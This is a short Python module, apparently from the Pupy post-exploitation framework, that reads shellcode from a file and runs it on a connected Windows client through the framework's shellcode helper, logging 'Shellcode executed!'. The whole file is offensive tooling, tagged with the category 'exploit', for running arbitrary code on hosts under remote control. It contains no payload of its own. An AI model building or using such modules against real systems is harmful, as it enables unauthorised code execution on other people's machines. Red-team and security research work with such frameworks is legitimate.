# -*- coding: utf-8 -*-

'''
Module by @byt3bl33d3r
'''

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser

__class_name__="ShellcodeExec"

@config(cat="exploit", compat="windows")
class ShellcodeExec(PupyModule):
    """ executes the supplied shellcode on a client """

    dependencies = ['pupwinutils.shellcode']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='shellcode_exec', description=cls.__doc__)
        cls.arg_parser.add_argument('path', help='Path to the shellcode to execute')

    def run(self, args):
        with open(args.path, 'r') as sfile:
            shellcode = sfile.read()
            self.client.conn.modules['pupwinutils.shellcode'].exec_shellcode(shellcode)
        self.log('Shellcode executed!')
